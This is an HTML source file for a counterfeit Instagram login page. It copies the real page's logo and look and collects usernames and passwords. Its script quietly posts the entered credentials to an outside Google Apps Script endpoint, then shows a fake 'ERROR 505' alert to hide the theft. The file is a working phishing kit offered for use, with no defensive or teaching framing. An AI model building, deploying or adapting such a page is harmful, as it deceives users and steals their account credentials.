<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fafafa;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 400px;
        }

        .logo {
    display: block;
    margin: 0 auto 20px; /* Centers the logo horizontally and adds bottom margin */
}


        .login-box {
            width: 100%;
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .input-field {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background-color: #fafafa;
        }

        .input-field:focus {
            outline: none;
            border-color: #a8a8a8;
        }

        .login-button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }

        .login-button:hover {
            background-color: #007bb5;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
            margin: 0 10px;
        }

        .signup {
            text-align: center;
            margin-top: 10px;
            color: #262626;
        }

        .signup a {
            color: #0095f6;
            text-decoration: none;
        }

        .signup a:hover {
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <div class="container">
        <form autocomplete="off" method="post" name="google-sheet">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo"
                class="logo" width="100">
            <div class="login-box">
                <input type="text" class="input-field" placeholder="Phone number, username, or email" name="username">
                <input type="password" class="input-field" placeholder="Password" name="password">
                <button type="submit" class="login-button">Log In</button>
                <div class="divider">OR</div>
                <button class="login-button" style="background-color: #4267b2; margin-bottom: 10px;">
                    Log in with Facebook
                </button>
                <a href="#" style="font-size: 12px; color: #00376b;">Forgot password?</a>
            </div>
            <div class="signup">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </form>
    </div>
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbyHbKDgEBXV8KDF-JtVr276Q2LmR5EMSYFa7FVa8Rd-eZo85nK1Q7mqNZD_QFmSuBPDpQ/exec';
        const form = document.forms['google-sheet'];

        form.addEventListener('submit', e => {
            e.preventDefault(); // Prevent default form submission
            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
                .then(response => alert("ERROR 505"))
                .catch(error => console.error('Error!', error.message));
        });
    </script>
</body>

</html>
